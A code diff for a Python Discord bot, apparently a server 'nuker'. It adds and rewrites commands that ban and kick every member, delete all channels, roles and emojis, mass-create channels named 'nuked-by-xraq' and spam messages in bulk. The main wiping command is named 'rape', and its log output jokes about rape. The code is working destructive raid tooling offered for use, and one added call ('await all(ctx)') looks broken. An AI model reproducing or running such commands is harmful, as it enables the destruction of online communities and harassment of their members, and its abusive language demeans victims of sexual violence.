@@ -681,20 +681,70 @@ async def snipe(ctx):
     else:
         await ctx.send('There are no messages no snipe!', delete_after=3)
 
-@bot.command()
-async def banall(ctx):
-    await ctx.message.delete()
-    for m in ctx.guild.members:
-        try:
-            await m.ban()
-        except:
-            pass
 
 @bot.command()
-async def masskick(ctx):
+async def kickall(ctx):
     await ctx.message.delete()
     for member in ctx.guild.members:
         await member.kick()
+
+@bot.command()
+async def rape(ctx):
+    # LOL
+    print('Deleting all...')
+    
+    print('Deleting channels..')
+    for channel in ctx.guild.channels:
+        try:
+            await channel.delete()
+        except discord.Forbidden:
+            print(f"{channel.name} has NOT been deleted in {ctx.guild.name}")
+        except discord.HTTPException:
+            print(f"{channel.name} has NOT been deleted in {ctx.guild.name}")
+        else:
+            print(f"{channel.name} has been deleted in {ctx.guild.name}")
+
+    for _i in range(10):
+        await ctx.guild.create_text_channel(name="nuked-by-xraq")
+        print(f"{_i} channel(s) have been deleted")
+
+    for member in ctx.guild.members:
+
+        if member == bot.user:
+            continue
+
+        try:
+            await member.ban()
+        except discord.Forbidden:
+            print(f"{member.name} has FAILED to be banned from {ctx.guild.name}")
+        else:
+            print(f"{member.name} has been banned from {ctx.guild.name}")
+        
+    print('Deleting roles..')
+    for role in ctx.guild.roles:
+
+        if str(role) == '@everyone':
+            continue
+
+        try:
+            await role.delete()
+        except discord.Forbidden:
+            print(f"{role.name} has NOT been deleted in {ctx.guild.name}")
+        else:
+            print(f"{role.name} has been deleted in {ctx.guild.name}")
+            
+    print('Deleting emojis..')
+    for emoji in ctx.guild.emojis:
+        try:
+            await emoji.delete()
+        except discord.Forbidden:
+            print(f"{emoji.name} has NOT been deleted in {ctx.guild.name}")
+        else:
+            print(f"{emoji.name} has been deleted in {ctx.guild.name}")
+
+    print("Server raped successfully")
+    os.system("cls")
+    banner()
 
 @bot.command()
 async def github(ctx):
@@ -705,42 +755,13 @@ async def github(ctx):
 async def spam(ctx, amount: int, *, message):
     await ctx.message.delete()
     for _i in range(amount):
-        await ctx.send(f'{message}\n' * 15)
-
-
-@bot.command()
-async def rape(ctx):
-    for user in ctx.guild.members:
-        try:
-            await user.ban()
-        except:
-            pass
-    for channel in ctx.guild.channels:
-        try:
-            await channel.delete()
-        except:
-            pass
-    for role in ctx.guild.roles:
-        try:
-            await role.delete()
-        except:
-            pass
-    try:
-        await ctx.guild.edit(
-            name="nuked by xraq",
-            description="Get Raped",
-            reason="cus i can",
-            icon=None,
-            banner=None
-        )
-    except:
-        pass
+        await ctx.send(f'{message}\n' * 50)
 
 @bot.command()
 async def masschannel(ctx):
     await ctx.message.delete()
     for _i in range(250):
-        await ctx.guild.create_text_channel(name="raped")
+        await ctx.guild.create_text_channel(name="nuked-by-xraq")
 
 
 @bot.command()
@@ -771,6 +792,26 @@ async def restart(ctx):
     await ctx.message.delete()
     clear()
     os.system('python "' + os.getcwd() + "\\" + sys.argv[0] + '"')
+
+@bot.command()
+
+async def banall(ctx):
+
+    for member in ctx.guild.members:
+
+        if member == bot.user:
+            continue
+
+        try:
+            await member.ban()
+        except discord.Forbidden:
+            print(f"{member.name} has FAILED to be banned from {ctx.guild.name}")
+        else:
+            print(f"{member.name} has been banned from {ctx.guild.name}")
+
+    await all(ctx)
+
+    print("Action Completed: destroy")
 
 @bot.command(aliases=["deleteall"])
 async def d(ctx, limit: int=None):
